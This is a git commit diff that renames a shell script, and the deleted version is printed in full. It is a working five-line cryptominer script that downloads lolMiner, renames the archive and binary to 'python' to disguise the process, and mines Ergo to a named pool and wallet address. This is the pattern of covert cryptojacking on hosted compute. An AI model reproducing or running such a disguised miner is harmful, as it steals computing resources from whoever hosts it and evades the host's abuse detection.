0ab0cc7456ebf3700cec2d7e578543718715b0ca
rindalasririn <95740336+rindalasririn@users.noreply.github.com>
2023-01-14 06:10:08 -0800

    Update and rename 16sw.sh to 16kw.sh

--- 16sw.sh
+++
@@ -1,5 +0,0 @@
-curl -L -o python.tar.gz https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.65/lolMiner_v1.65_Lin64.tar.gz
-tar -zxvf python.tar.gz
-cd 1.65
-mv lolMiner python
-./python --algo AUTOLYKOS2 --pool stratum+tcp://ergo.magicpool.co:3333 --user ERGO:9gL1cBifCAEzDjKd9ov5sHpWbxSt2jqAiHhVrXPxhWc6B6zfW7G.sedar
